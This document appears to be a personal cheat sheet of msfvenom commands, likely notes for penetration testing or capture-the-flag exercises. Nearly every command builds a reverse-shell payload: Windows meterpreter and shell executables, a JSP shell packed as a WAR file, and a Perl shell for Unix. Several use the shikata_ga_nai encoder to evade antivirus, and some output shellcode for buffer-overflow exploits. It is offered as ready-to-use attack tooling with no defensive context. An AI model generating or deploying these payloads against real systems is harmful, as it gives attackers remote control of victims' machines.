# MSFVenom Commands
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.6.30.236 LPORT=4444 -f war > shell.war
```
```
msf-pattern_create -l 200
```


```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.5.52 LPORT=4444 -e x06/shikata_ga_nai -f exe -b "\x00\x0a" -f python -v payload
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.93 LPORT=1234 -b "\x00" -f python -v payload
```
Ruby payload:
```
msfvenom -p cmd/unix/reverse_perl LHOST=<attacker_IP> LPORT=4000 -f raw
```
a payload example for msfvenom
```
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```
```
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```
```
msfvenom -p windows/x64/meterpreter/reverse_tcp --encoder x64/shikata_ga_nai LHOST=10.10.16.6 LPORT=4444 -f exe -o shell.exe 
```
